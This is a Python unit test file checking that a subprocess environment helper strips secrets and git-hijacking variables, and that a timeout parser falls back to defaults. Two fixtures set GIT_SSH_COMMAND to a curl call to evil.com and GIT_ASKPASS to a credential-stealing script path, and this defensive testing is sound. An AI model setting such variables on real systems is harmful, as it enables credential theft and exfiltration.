"""Unit tests for env_utils — the shared subprocess environment utility."""
import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "app"))


def test_safe_env_strips_aicore(monkeypatch):
    monkeypatch.setenv("AICORE_CLIENT_ID", "secret")
    from tools.env_utils import _safe_env
    env = _safe_env()
    assert "AICORE_CLIENT_ID" not in env


def test_safe_env_strips_sap(monkeypatch):
    monkeypatch.setenv("SAP_SERVICE_KEY", "secret")
    from tools.env_utils import _safe_env
    env = _safe_env()
    assert "SAP_SERVICE_KEY" not in env


def test_safe_env_strips_mcp(monkeypatch):
    monkeypatch.setenv("MCP_SERVER_URLS", "http://internal")
    from tools.env_utils import _safe_env
    env = _safe_env()
    assert "MCP_SERVER_URLS" not in env


def test_safe_env_strips_git_ssh_command(monkeypatch):
    """L-R3-3 fix: GIT_SSH_COMMAND must be stripped to prevent git hook exfiltration."""
    monkeypatch.setenv("GIT_SSH_COMMAND", "curl http://evil.com")
    from tools.env_utils import _safe_env
    env = _safe_env()
    assert "GIT_SSH_COMMAND" not in env


def test_safe_env_strips_git_askpass(monkeypatch):
    """L-R3-3 fix: GIT_ASKPASS must be stripped."""
    monkeypatch.setenv("GIT_ASKPASS", "/tmp/steal-creds.sh")
    from tools.env_utils import _safe_env
    env = _safe_env()
    assert "GIT_ASKPASS" not in env


def test_safe_env_keeps_path(monkeypatch):
    """PATH must be preserved so binaries can be found."""
    from tools.env_utils import _safe_env
    env = _safe_env()
    assert "PATH" in env


def test_parse_timeout_valid():
    from tools.env_utils import _parse_timeout
    import os
    os.environ["TEST_TIMEOUT_VALID"] = "30"
    assert _parse_timeout("TEST_TIMEOUT_VALID", 60) == 30
    del os.environ["TEST_TIMEOUT_VALID"]


def test_parse_timeout_invalid_string_uses_default():
    """L-R3-2 fix: Non-integer timeout value must fall back to default, not raise."""
    from tools.env_utils import _parse_timeout
    import os
    os.environ["TEST_TIMEOUT_BAD"] = "abc"
    result = _parse_timeout("TEST_TIMEOUT_BAD", 60)
    assert result == 60
    del os.environ["TEST_TIMEOUT_BAD"]


def test_parse_timeout_missing_uses_default():
    from tools.env_utils import _parse_timeout
    import os
    os.environ.pop("TEST_TIMEOUT_MISSING", None)
    assert _parse_timeout("TEST_TIMEOUT_MISSING", 45) == 45


def test_parse_timeout_zero_uses_default():
    """Zero timeout is nonsensical — must fall back to default."""
    from tools.env_utils import _parse_timeout
    import os
    os.environ["TEST_TIMEOUT_ZERO"] = "0"
    assert _parse_timeout("TEST_TIMEOUT_ZERO", 60) == 60
    del os.environ["TEST_TIMEOUT_ZERO"]
